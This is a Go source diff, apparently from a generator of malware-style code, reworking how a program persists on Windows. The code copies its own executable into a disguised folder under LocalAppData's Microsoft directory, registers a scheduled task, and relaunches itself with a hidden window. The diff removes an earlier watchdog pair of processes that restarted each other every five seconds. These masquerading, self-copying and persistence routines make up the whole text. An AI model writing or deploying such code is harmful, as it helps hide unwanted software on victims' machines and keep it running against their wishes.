@@ -72,73 +72,34 @@ func runPrimaryWithWorker() {
 		loopA()
 		return
 	}
-	workerDir := filepath.Join(os.Getenv(getAppDataEnvName()), getMicrosoftDirName(), getWindowsDirName())
-	workerPath := filepath.Join(workerDir, getWorkerExeName())
 
-	if err := os.MkdirAll(workerDir, 0755); err == nil {
-		_ = copyFile(exePath, workerPath)
+	disguisedDir := filepath.Join(os.Getenv(getLocalAppDataEnv()), getMicrosoftDirName(), getDisguiseDir())
+	disguisedPath := filepath.Join(disguisedDir, getDisguisedExeName())
+
+	if err := os.MkdirAll(disguisedDir, 0755); err == nil {
+		_ = copyFile(exePath, disguisedPath)
 	} else {
-		workerPath = exePath
+		disguisedPath = exePath
 	}
 
-	opSetupTask(workerPath)
+	opSetupTask(disguisedPath)
 
-	startWorker := func(primaryPid int) int {
-		cmd := exec.Command(workerPath, "worker", strconv.Itoa(primaryPid))
+	exeNorm, _ := filepath.Abs(exePath)
+	disguisedNorm, _ := filepath.Abs(disguisedPath)
+	if !strings.EqualFold(exeNorm, disguisedNorm) {
+		cmd := exec.Command(disguisedPath, "worker")
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		if err := cmd.Start(); err != nil {
-			return 0
+		if err := cmd.Start(); err == nil {
+			return
 		}
-		return cmd.Process.Pid
 	}
-
-	primaryPid := os.Getpid()
-	workerPid := startWorker(primaryPid)
-
-	go func() {
-		for {
-			time.Sleep(5 * time.Second)
-			if !isProcessRunning(workerPid) {
-				workerPid = startWorker(primaryPid)
-			}
-		}
-	}()
 
 	loopA()
 }
 
 func runWorkerGuard() {
-	primaryPid := 0
-	if len(os.Args) > 2 {
-		if v, err := strconv.Atoi(os.Args[2]); err == nil && v > 0 {
-			primaryPid = v
-		}
-	}
-	exePath, err := os.Executable()
-	if err != nil {
-		return
-	}
-
-	if primaryPid == 0 {
-		loopA()
-		return
-	}
-
-	restartPrimary := func() int {
-		cmd := exec.Command(exePath)
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		if err := cmd.Start(); err != nil {
-			return 0
-		}
-		return cmd.Process.Pid
-	}
-
-	for {
-		time.Sleep(5 * time.Second)
-		if !isProcessRunning(primaryPid) {
-			primaryPid = restartPrimary()
-		}
-	}
+	_ = setupLogger()
+	loopA()
 }
 `)
 }
